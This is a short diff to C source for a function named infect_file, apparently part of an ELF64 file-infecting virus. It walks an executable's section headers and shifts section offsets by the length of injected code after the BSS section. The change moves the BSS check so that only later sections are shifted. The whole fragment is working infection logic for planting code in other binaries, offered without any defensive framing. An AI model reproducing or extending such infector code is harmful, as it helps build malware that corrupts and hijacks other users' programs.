@@ -137,8 +137,6 @@ void	infect_file(char *name) {
 		Shdr = (Elf64_Shdr *)buffer + counter;
 		current_offset = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
 		// printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
-		if (Shdr->sh_type == SHT_NOBITS) // FOUND BSS SECTION
-			found = 1;
 		if (found) {
 			// INCREMENTING NEXT SECTIONS BY CODELEN + BSS SIZE
 			// printf("Incrementing section offset\n");
@@ -148,6 +146,8 @@ void	infect_file(char *name) {
 			Shdr->sh_offset += codeLen;
 			write(fd, &Shdr->sh_offset, sizeof(uint64_t));
 		}
+		if (Shdr->sh_type == SHT_NOBITS) // FOUND BSS SECTION
+			found = 1;
 		counter++;
 	}
 	close(fd);
